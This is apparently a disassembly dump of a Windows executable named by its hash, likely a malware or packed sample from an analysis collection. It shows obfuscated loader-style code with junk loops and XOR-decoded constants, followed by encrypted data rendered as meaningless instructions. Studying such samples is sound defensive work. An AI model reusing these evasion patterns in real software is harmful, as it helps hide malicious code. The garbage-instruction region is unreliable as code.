
c6b2ec51ec97567661ebd9d529a4d83e989807cd3140bed5464073b92d3f832c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xcc7fc454
  40157e:	scas   al,BYTE PTR es:[edi]
  40157f:	(bad)  
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [eax],ebx
  401595:	mov    ecx,DWORD PTR [edx+0x22b38a8b]
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x265c06c4],0x1
  40162d:	icebp  
  40162e:	cs or  eax,eax
  401631:	sub    esp,ebx
  401633:	add    bh,BYTE PTR [edx]
  401635:	ror    DWORD PTR gs:[esi-0x4a],1
  401639:	xchg   edi,eax
  40163a:	mov    cl,0x52
  40163c:	(bad)  
  40163f:	jno    0x4016a9
  401641:	test   al,0xa3
  401643:	jge    0x4015d0
  401645:	psubusb mm1,QWORD PTR [ebp+0x8]
  401649:	(bad)  
  40164a:	mov    al,BYTE PTR [edi]
  40164c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40164d:	push   ecx
  40164e:	outs   dx,BYTE PTR ds:[esi]
  40164f:	clc    
  401650:	das    
  401651:	aas    
  401652:	dec    ebx
  401653:	xor    esi,DWORD PTR [edi-0x50]
  401656:	mov    ebx,DWORD PTR [eax+0x3]
  401659:	jns    0x40164b
  40165b:	ins    DWORD PTR es:[edi],dx
  40165c:	or     edi,ebx
  40165e:	mov    ch,0x31
  401660:	mov    al,ds:0xf0ad543c
  401665:	jg     0x40168c
  401667:	and    eax,0x3a6c12b9
  40166c:	jns    0x401619
  40166e:	aaa    
  40166f:	cwde   
  401670:	lods   al,BYTE PTR ds:[esi]
  401671:	dec    eax
  401672:	pop    edi
  401673:	push   cs
  401674:	adc    eax,0x389aa8b4
  401679:	and    eax,0xda8f6c57
  40167e:	mov    bh,0x2c
  401680:	dec    esi
  401681:	jo     0x401628
  401683:	cmp    al,0x67
  401685:	mov    dl,0x32
  401687:	adc    eax,DWORD PTR [edi+0x1b921236]
  40168d:	lahf   
  40168e:	sub    eax,0xc9062c7e
  401693:	fisubr DWORD PTR [edx+0x34]
  401696:	jmp    0x401717
  401698:	call   0x6a2e2051
  40169d:	adc    ebx,esp
  40169f:	cmc    
  4016a0:	std    
  4016a1:	(bad)  
  4016a2:	fmul   DWORD PTR [ebx]
  4016a4:	sub    esp,ebx
  4016a6:	mov    eax,0xd8b97637
  4016ab:	xchg   ebx,eax
  4016ac:	hlt    
  4016ad:	arpl   sp,cx
  4016af:	mov    DWORD PTR [ebp-0x59dd6bb7],eax
  4016b5:	(bad)
  4016ba:	inc    ecx
  4016bb:	jmp    0xc42b2c56
  4016c0:	mov    bl,BYTE PTR [eax+edx*2]
  4016c3:	sbb    ecx,DWORD PTR [edi]
  4016c5:	mov    ecx,DWORD PTR [edi-0x4f88f5a7]
  4016cb:	loope  0x401705
  4016cd:	scas   al,BYTE PTR es:[edi]
  4016ce:	push   edx
  4016cf:	into   
  4016d0:	sti    
  4016d1:	call   0x5bd7e909
  4016d6:	(bad)  [edi+0x1d9a6b94]
  4016dc:	ins    BYTE PTR es:[edi],dx
  4016dd:	cmp    eax,0x62c6aa58
  4016e2:	pop    edi
  4016e3:	mov    ds:0xcbe8c7db,al
  4016e8:	out    dx,eax
  4016e9:	out    dx,eax
  4016ea:	mov    bl,0xff
  4016ec:	ins    BYTE PTR es:[edi],dx
  4016ed:	cld    
  4016ee:	sbb    eax,0xe66384d8
  4016f3:	xchg   edx,eax
  4016f4:	mov    ebp,0x18556058
  4016f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016fa:	stos   DWORD PTR es:[edi],eax
  4016fb:	inc    esi
  4016fc:	rcr    eax,1
  4016fe:	mov    ch,0xb5
  401700:	fistp  QWORD PTR [ebp+0x77]
  401703:	fmulp  st(5),st
  401705:	sbb    DWORD PTR [eax],esp
  401707:	ins    DWORD PTR es:[edi],dx
  401708:	sbb    BYTE PTR fs:[ebx-0xfa383b9],0x70
  401710:	or     DWORD PTR [eax],ebx
  401712:	out    0xd1,eax
  401714:	cmp    esi,0x4b
  401717:	or     dl,BYTE PTR [eax]
  401719:	lods   eax,DWORD PTR ds:[esi]
  40171a:	sbb    eax,0xaa3c9490
  40171f:	gs iret 
  401721:	dec    edi
  401722:	jae    0x40171f
  401724:	jle    0x401766
  401726:	dec    esp
  401727:	mov    BYTE PTR [ebx-0x52d87ad2],ch
  40172d:	cwde   
  40172e:	arpl   WORD PTR [eax],bx
  401730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401731:	and    esp,DWORD PTR [edi-0x4d]
  401734:	and    eax,0x9084c6bb
  401739:	cmp    al,0xaf
  40173b:	mov    ecx,0x6ee54eb2
  401740:	in     al,dx
  401741:	mov    ecx,0x8737aa46
  401746:	loope  0x4016d9
  401748:	pop    ecx
  401749:	hlt    
  40174a:	aas    
  40174b:	bnd jae 0x4016f0
  40174e:	mov    edx,DWORD PTR [edi+0x7f]
  401751:	mov    cl,0x21
  401753:	inc    edx
  401754:	jmp    0x852630aa
  401759:	jns    0x401740
  40175b:	fs sub eax,0x499b0532
  401761:	in     eax,dx
  401762:	repz mov ds:0x8a27fe76,eax
  401769:	cmp    BYTE PTR [ebx],cl
  40176b:	cmc    
  40176c:	out    0xed,eax
  40176e:	xor    ah,BYTE PTR [ebp+0x34]
  401771:	int3   
  401772:	stos   BYTE PTR es:[edi],al
  401773:	jp     0x401703
  401775:	xchg   ebp,eax
  401776:	push   ebp
  401777:	jno    0x401748
  401779:	xor    al,0x78
  40177b:	pop    ebp
  40177c:	stos   BYTE PTR es:[edi],al
  40177d:	mov    ebx,DWORD PTR [edi-0x1bacf5fa]
  401783:	jp     0x401715
  401785:	sub    eax,0x50300caa
  40178a:	push   ebx
  40178b:	xchg   esp,eax
  40178c:	or     DWORD PTR [eax+0x38703e78],0x74294aa8
  401796:	out    dx,al
  401797:	pushf  
  401798:	push   eax
  401799:	push   es
  40179a:	jle    0x4017bb
  40179c:	inc    ebx
  40179d:	aas    
  40179e:	data16 aaa 
  4017a0:	xor    BYTE PTR [esi-0x37],bh
  4017a3:	test   al,0x74
  4017a5:	data16 jne 0x4017b8
  4017a8:	leave  
  4017a9:	sbb    al,0xd7
  4017ab:	push   cs
  4017ac:	push   edi
  4017ae:	sar    BYTE PTR cs:0x382459ca,0x38
  4017b6:	push   ebp
  4017b7:	dec    edx
  4017b8:	lods   eax,DWORD PTR ds:[esi]
  4017b9:	add    DWORD PTR [esi+0x55],ebx
  4017bc:	pop    es
  4017bd:	pop    esp
  4017be:	mov    al,ds:0x8ab1c7ee
  4017c3:	inc    edi
  4017c4:	out    dx,al
  4017c5:	push   ss
  4017c6:	mov    ds:0x82f208b9,al
  4017cb:	add    eax,0x41e25b2a
  4017d0:	(bad)  
  4017d1:	(bad)  
  4017d2:	jne    0x4017d6
  4017d4:	mov    ds:0xb8db27c5,al
  4017d9:	in     eax,dx
  4017da:	push   eax
  4017db:	add    bl,BYTE PTR [eax-0x21]
  4017de:	fst    QWORD PTR [ecx+edx*8+0x22]
  4017e2:	ss pop edx
  4017e4:	test   BYTE PTR [esi],al
  4017e6:	jno    0x401859
  4017e8:	pop    edi
  4017e9:	and    BYTE PTR [ebx],0x90
  4017ec:	fadd   DWORD PTR [esi+0x1d]
  4017ef:	dec    eax
  4017f0:	inc    ecx
  4017f1:	dec    esi
  4017f2:	pop    edx
  4017f3:	dec    ebx
  4017f4:	add    DWORD PTR [esi],esp
  4017f6:	adc    cl,BYTE PTR [ebx]
  4017f8:	arpl   WORD PTR [esi],cx
  4017fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017fb:	jmp    0x401829
  4017fd:	repnz or dh,BYTE PTR [edx]
  401800:	push   esi
  401801:	call   0xd48d:0x8b04142e
  401808:	mov    DWORD PTR [edi+0x6a],ecx
  40180b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40180c:	lds    ecx,FWORD PTR [ebx+0x154c1c8f]
  401812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401813:	pop    bx
  401815:	xchg   ebp,eax
  401816:	jo     0x4017d6
  401818:	retf   
  401819:	dec    edi
  40181a:	ror    DWORD PTR [ebp-0xa],cl
  40181d:	ins    DWORD PTR es:[edi],dx
  40181e:	and    eax,0xd742c220
  401823:	inc    edi
  401824:	pop    esi
  401825:	in     al,0x41
  401827:	(bad)  
  401828:	ins    DWORD PTR es:[edi],dx
  401829:	ja     0x4017bd
  40182b:	arpl   WORD PTR [eax+0x68a78b19],bp
  401831:	aam    0x39
  401833:	sbb    DWORD PTR [ebx-0x5e],0xffffff86
  401837:	hlt    
  401838:	sahf   
  401839:	mov    eax,ds:0x641d2bb6
  40183e:	or     al,dl
  401840:	adc    bh,ah
  401842:	dec    ebp
  401843:	aaa    
  401844:	sbb    eax,0xdf86cfe5
  401849:	jnp    0x4017fa
  40184b:	out    0xfa,al
  40184d:	loopne 0x401883
  40184f:	fld1   
  401851:	mov    edx,0x2344d276
  401856:	or     BYTE PTR [edi-0x2],ch
  401859:	mov    BYTE PTR [ecx-0x7],dl
  40185c:	jno    0x40187c
  40185e:	test   BYTE PTR [ebx],0x8f
  401861:	dec    eax
  401862:	sbb    BYTE PTR [edi-0x18],bl
  401865:	inc    eax
  401866:	rcr    DWORD PTR [esi],1
  401868:	iret   
  401869:	pop    ebx
  40186a:	inc    edi
  40186b:	jo     0x401829
  40186d:	jne    0x401852
  40186f:	pinsrw mm6,ecx,0x50
  401873:	adc    esi,esp
  401875:	push   cs
  401876:	test   BYTE PTR [ecx+0xab1f48a],bh
  40187c:	cmp    DWORD PTR [eax-0x24],0xffffff85
  401880:	xchg   BYTE PTR [esp+edi*4],dl
  401883:	pop    edi
  401884:	xor    DWORD PTR [ebx-0x2],esi
  401887:	cwde   
  401888:	inc    esp
  401889:	add    eax,0x6ec53b76
  40188e:	xor    esi,DWORD PTR [edx]
  401890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401891:	std    
  401892:	push   esi
  401893:	xchg   ecx,eax
  401894:	sbb    cl,BYTE PTR [edi+0x3330b5ed]
  40189a:	cs adc eax,0x97812fcd
  4018a0:	iret   
  4018a1:	loop   0x4018e2
  4018a3:	xchg   esp,eax
  4018a4:	mov    edi,0x404b9965
  4018a9:	add    DWORD PTR [ecx],eax
  4018ab:	xor    BYTE PTR [edi],al
  4018ad:	dec    ebx
  4018ae:	scas   al,BYTE PTR es:[edi]
  4018af:	add    eax,0xed6ce6e1
  4018b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018b5:	loop   0x40189b
  4018b7:	pusha  
  4018b8:	xlat   BYTE PTR ds:[ebx]
  4018b9:	mov    ds:0x90cb5ca0,eax
  4018be:	mov    BYTE PTR [esi+edi*4],al
  4018c1:	sub    al,0x7b
  4018c3:	xor    DWORD PTR [edi],esi
  4018c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018c6:	gs xor al,0x72
  4018c9:	lods   al,BYTE PTR ds:[esi]
  4018ca:	cmp    eax,0xee476591
  4018cf:	inc    edi
  4018d0:	mov    al,0xb
  4018d2:	iret   
  4018d3:	sar    DWORD PTR [esi],1
  4018d5:	gs test al,0xb7
  4018d8:	inc    ecx
  4018d9:	mov    edx,0x70254fea
  4018de:	data16 std 
  4018e0:	dec    eax
  4018e1:	(bad)  
  4018e3:	sub    DWORD PTR [ecx-0x21],0xe6ff6212
  4018ea:	imul   BYTE PTR [edx+0x3]
  4018ed:	cli    
  4018ee:	int3   
  4018ef:	pushf  
  4018f0:	xor    eax,0x5c6d6d90
  4018f5:	push   esi
  4018f6:	imul   ebx,DWORD PTR [esi+eax*8-0x5851f51a],0x44
  4018fe:	fidivr WORD PTR [eax-0x76d4eb19]
  401904:	or     ebp,DWORD PTR [edi+0x5e]
  401907:	and    al,0xc2
  401909:	pop    edx
  40190a:	dec    edx
  40190b:	stc    
  40190c:	mov    ah,0x3
  40190e:	or     al,0x1f
  401910:	(bad)  
  401911:	pop    edx
  401912:	sbb    DWORD PTR [edi+0x53c6574c],ebp
  401918:	xchg   ebp,eax
  401919:	mov    dl,0x15
  40191b:	sbb    edi,ebp
  40191d:	adc    al,0x4b
  40191f:	mov    ebp,es
  401921:	xchg   DWORD PTR [ebx+ebx*4],edx
  401924:	xor    eax,0x9caea2a4
  401929:	nop
  40192a:	cmp    bh,BYTE PTR [ebx+0x74]
  40192d:	mov    ds:0x3cd961cd,eax
  401932:	aad    0xb
  401934:	ja     0x401978
  401936:	popa   
  401937:	xchg   DWORD PTR [ecx],edx
  401939:	adc    al,BYTE PTR [ebp-0x56]
  40193c:	outs   dx,BYTE PTR ds:[esi]
  40193d:	es jge 0x401907
  401940:	std    
  401941:	pop    es
  401942:	bound  edx,QWORD PTR [ebp+edx*2-0x5d9f2cb1]
  401949:	xor    eax,0x23b365fb
  40194e:	(bad)
  401951:	imul   ecx,esi,0x43e7e8e7
  401957:	idiv   edx
  401959:	adc    BYTE PTR [edx+0x78],ah
  40195c:	imul   edx,ecx,0x4cbe0e0
  401962:	fwait
  401963:	jmp    0x4fd1:0x7d48878e
  40196a:	inc    eax
  40196b:	mov    ebx,0x9a27bc48
  401970:	(bad)  
  401972:	fs jb  0x4019be
  401975:	dec    ebx
  401976:	jne    0x4019bc
  401978:	adc    BYTE PTR [esi-0x1cec005c],dh
  40197e:	call   0x791327d3
  401983:	xor    DWORD PTR [edx+0x1a],ecx
  401986:	push   cs
  401987:	je     0x4019da
  401989:	mov    eax,cs
  40198b:	bound  ecx,QWORD PTR [edi+0x45]
  40198e:	and    BYTE PTR [esi],ch
  401990:	and    DWORD PTR ds:0xd503a799,edi
  401996:	cld    
  401997:	retf   
  401998:	inc    ecx
  401999:	dec    ebx
  40199a:	add    eax,0x2b36956e
  40199f:	in     eax,dx
  4019a0:	jno    0x4019e7
  4019a2:	pushf  
  4019a3:	or     edx,esi
  4019a5:	push   ecx
  4019a6:	(bad)  
  4019a7:	fidivr DWORD PTR [ebx-0x390f4c48]
  4019ad:	loope  0x401996
  4019af:	pop    es
  4019b0:	fsubrp st(2),st
  4019b2:	lods   al,BYTE PTR ds:[esi]
  4019b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019b4:	xchg   edx,eax
  4019b5:	outs   dx,DWORD PTR ds:[esi]
  4019b6:	sahf   
  4019b7:	(bad)  
  4019b8:	js     0x40194d
  4019ba:	push   esp
  4019bc:	outs   dx,BYTE PTR ds:[esi]
  4019bd:	mov    bh,0x35
  4019bf:	clc    
  4019c0:	lea    eax,[esi+ebx*8-0x15c54b8e]
  4019c7:	pop    esp
  4019c8:	add    al,0x9d
  4019ca:	into   
  4019cb:	iret   
